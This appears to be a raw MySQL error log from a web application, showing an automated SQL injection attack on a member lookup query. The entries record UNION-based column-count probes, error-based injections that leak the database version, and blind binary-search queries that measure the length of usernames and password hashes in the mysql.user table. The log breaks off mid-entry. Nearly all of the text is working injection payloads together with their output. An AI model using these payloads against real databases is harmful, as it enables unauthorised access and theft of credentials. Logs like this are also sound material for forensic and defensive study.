SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 and 1=2 union select 0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e,0x5e5e5e6161615e5e5e--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:14
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:15
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
message:
The used SELECT statements have a different number of columns

2011-11-23 20:24:16
SQL:
SELECT * FROM bf_members WHERE id=4 and row(1,1)>(select count(*),concat(version(),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1)--
message:
Duplicate entry '5.1.36-community:0' for key 'group_key'

2011-11-23 20:24:38
SQL:
SELECT * FROM bf_members WHERE id=4 and(select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)--
message:
Duplicate entry '5.1.36-community1' for key 'group_key'

2011-11-23 20:25:34
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:34
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:34
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:35
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 0,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>60 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>46 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>39 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:36
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>35 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)>32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(password) from (select * from (select * from mysql.user order by user limit 1,1) t order by user desc)t limit 1)=33 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)<=32 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>144 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
SELECT * FROM bf_members WHERE id=4 and (select char_length(user) from (select * from (select * from mysql.user order by user limit 2,1) t order by user desc)t limit 1)>88 and 1<2
message:
Table 'user' is marked as crashed and should be repaired

2011-11-23 20:25:37
SQL:
